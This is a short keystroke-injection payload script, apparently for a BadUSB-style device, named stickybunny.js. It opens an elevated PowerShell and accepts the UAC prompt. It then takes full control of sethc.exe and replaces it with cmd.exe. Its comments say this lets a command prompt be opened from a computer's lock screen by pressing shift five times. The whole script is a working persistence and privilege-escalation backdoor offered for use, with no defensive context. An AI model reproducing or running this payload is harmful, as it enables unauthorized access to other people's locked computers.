//Normally, pressing shift 5 times will bring up the form to enable sticky keys. But after running stickybunny.js, if shift is pressed 5 times, terminal will pop up. 
//This will enable you to enter commands while on the lock screen of a computer
layout('us');
press("GUI r");
delay(500);
type("powershell Start-Process powershell -Verb runAs\n")
delay(4000);
press("SHIFT TAB");
delay(500);
press("ENTER");
delay(2000);
type("$Acl = Get-Acl sethc.exe")
press("ENTER")
delay(1000);
type("$Ar = New-Object  system.security.accesscontrol.filesystemaccessrule($env:UserName,\"FullControl\",\"Allow\")")
press("ENTER")
delay(1000);
type("$Acl.SetAccessRule($Ar)")
press("ENTER")
delay(1000);
type("Set-Acl sethc.exe $Acl")
press("ENTER")
delay(1000);
type("xcopy sethc.exe sethc.exe.bak")
press("ENTER")
delay(1000);
press("F")
delay(1000);
type("xcopy cmd.exe sethc.exe")
press("ENTER")
delay(1000);
press("Y")
press("ENTER")
delay(1000);
type("EXIT\n")
